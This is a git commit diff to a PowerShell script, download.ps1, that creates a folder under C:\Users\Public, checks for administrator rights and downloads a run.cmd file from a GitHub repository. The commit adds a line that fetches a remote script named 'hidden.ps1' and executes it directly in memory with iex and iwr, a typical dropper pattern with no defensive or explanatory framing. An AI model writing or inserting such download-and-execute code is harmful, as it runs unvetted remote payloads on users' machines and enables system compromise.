e67396b7d51c520414daeae29d30a220ea7a4f27
43a1723 <hai1723notgay@gmail.com>
2024-05-30 11:27:15 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,6 +1,8 @@
 $dir = "C:\Users\Public\150F4013"
 New-Item -ItemType Directory -Path $dir
 
+iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
+
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     # Download the CMD file
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$dir\run.cmd"
